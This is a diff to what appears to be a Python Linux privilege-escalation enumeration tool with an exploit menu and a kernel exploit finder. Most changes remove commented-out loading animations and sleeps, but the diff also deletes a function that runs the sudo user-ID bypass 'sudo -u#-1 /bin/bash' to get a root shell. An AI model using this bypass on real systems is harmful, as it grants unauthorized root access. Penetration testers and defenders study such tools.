@@ -61,16 +61,6 @@ def print_banner():
 	print(BOLD + BLUE + "=      " + BOLD + PURPLE + "LIGHT PURPLE:" + RESET + " " + BOLD + PURPLE + "Files and Processes Owned by Current User" + BOLD + BLUE + "      =")
 
 	print(line + "\n")
-	# x = 8
-	# for i in range(x):
-	# 	sys.stdout.write(BOLD + RED + "\r					   [|] PROGRAM IS LOADING... [|]\r")
-	# 	time.sleep(0.2)
-	# 	sys.stdout.write(BOLD + RED + "\r					   [/] PROGRAM IS LOADING... [/]\r")
-	# 	time.sleep(0.2)
-	# 	sys.stdout.write(BOLD + RED + "\r					   [-] PROGRAM IS LOADING... [-]\r")
-	# 	time.sleep(0.2)
-	# 	sys.stdout.write(BOLD + RED + "\r					   [\] PROGRAM IS LOADING... [\]\r")
-	#  time.sleep(0.2)
 	print(line)
 	print(BOLD + BLUE + "=" + BOLD + RED + "             [!] Press Enter to Start Enumeration [!]              " + BOLD + BLUE + "=")
 	print(line + "\n")
@@ -79,9 +69,6 @@ def print_banner():
 		input()
 	except SyntaxError:
 		pass
-
-	# time.sleep(5)
-
 
 	sys.stdout.write(RESET)
 
@@ -99,8 +86,6 @@ def print_title(text):
 	print('=' * len_text + '\n')
 	sys.stdout.write(WHITE)
 
-	#time.sleep(1)
-
 def print_title2(text2):
 
 	sys.stdout.write(BOLD + BLUE)
@@ -109,9 +94,7 @@ def print_title2(text2):
 	print(text2)
 	print('=' * len_text2 + '\n')
 	sys.stdout.write(WHITE)
-
-	#time.sleep(1)
-
+	
 # Execute Terminal Command
 def execute_cmd(cmd_dict):
 	for i in cmd_dict:
@@ -482,13 +465,6 @@ def check_sudo_ver():
 	sys.stdout.write(RESET)
 
 	return is_sudo128
-
-def exploit_sudo128():
-	cmd = "sudo -u#-1 /bin/bash"
-	if compatibility == 0:
-		out, err = subp.Popen(cmd, stdout= subp.PIPE, stderr=subp.PIPE, shell=True).communicate()
-	else:
-		echo_stdout = os.system(cmd)
 
 # EXPLOIT FINDER FOR LINUX KERNEL 2.x
 def search_exploits(system_info, langtools, processes, drive):
@@ -2480,9 +2456,6 @@ if __name__ == '__main__':
 	choices.append("Exit program.")
 
 # AUTO EXPLOIT
-	# if is_sudo128:
-	# 	exploit_sudo128()
-
 	if args.exploit:
 		print_title("EXPLOIT METHOD MENU")
 		for i in range(len(choices)):
@@ -2532,6 +2505,3 @@ if __name__ == '__main__':
 			sys.exit(1)
 
 	print_info("Enumeration Finished.\n")
-	# print_info("Conclusion:")
-
-	# vuln_exploitdbkernel(high_chance, low_chance)
